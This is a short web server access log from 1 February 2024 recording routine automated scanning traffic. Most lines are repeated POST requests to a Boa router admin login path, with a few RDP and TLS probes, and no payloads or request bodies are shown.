94.156.66.229 - - [01/Feb/2024:12:46:04 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [01/Feb/2024:12:46:04 +0000] "" 400 0 "-" "-"
45.118.146.123 - - [01/Feb/2024:12:49:34 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
45.118.146.123 - - [01/Feb/2024:12:49:34 +0000] "" 400 0 "-" "-"
94.156.66.21 - - [01/Feb/2024:12:50:32 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [01/Feb/2024:12:50:33 +0000] "" 400 0 "-" "-"
94.156.66.229 - - [01/Feb/2024:12:59:29 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [01/Feb/2024:12:59:29 +0000] "" 400 0 "-" "-"
94.156.66.21 - - [01/Feb/2024:13:00:01 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [01/Feb/2024:13:00:01 +0000] "" 400 0 "-" "-"
94.156.66.229 - - [01/Feb/2024:13:07:37 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [01/Feb/2024:13:07:38 +0000] "" 400 0 "-" "-"
94.156.66.21 - - [01/Feb/2024:13:07:56 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [01/Feb/2024:13:07:56 +0000] "" 400 0 "-" "-"
185.170.144.3 - - [01/Feb/2024:13:09:53 +0000] "\x03\x00\x00/*\xE0\x00\x00\x00\x00\x00Cookie: mstshash=Administr" 400 154 "-" "-"
94.156.66.229 - - [01/Feb/2024:13:14:32 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [01/Feb/2024:13:14:32 +0000] "" 400 0 "-" "-"
94.156.66.21 - - [01/Feb/2024:13:16:21 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.21 - - [01/Feb/2024:13:16:21 +0000] "" 400 0 "-" "-"
52.81.185.110 - - [01/Feb/2024:13:20:18 +0000] "\x16\x03\x01\x01\x10\x01\x00\x01\x0C\x03\x03U`\x8B\xB66`'\xF4;\xDA\xFE\xC8\x1E\x0F\xE8\xE9\xA9\x02\x1Fv;8\xBE\xCCg\xD7V~\x89,\xADM \x83\xDB\xC4\x1D\xBA\xD6\xE5\x95\xF3J\x854,\xC0Ll\xE9zX\xA0D\x07Rt\x84/\x9BF\xD9\xF6\x8B~\x00&\xC0+\xC0/\xC0,\xC00\xCC\xA9\xCC\xA8\xC0\x09\xC0\x13\xC0" 400 154 "-" "-"
34.162.111.119 - - [01/Feb/2024:13:22:45 +0000] "GET / HTTP/1.1" 301 166 "-" "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/78.0.3904.108 Safari/537.36"
34.162.111.119 - - [01/Feb/2024:13:22:45 +0000] "" 400 0 "-" "-"
94.156.66.229 - - [01/Feb/2024:13:27:43 +0000] "POST /boaform/admin/formLogin HTTP/1.1" 301 166 "http://180.233.121.154:80/admin/login.asp" "Mozilla/5.0 (X11; Ubuntu; Linux x86_64; rv:71.0) Gecko/20100101 Firefox/71.0"
94.156.66.229 - - [01/Feb/2024:13:27:43 +0000] "" 400 0 "-" "-"
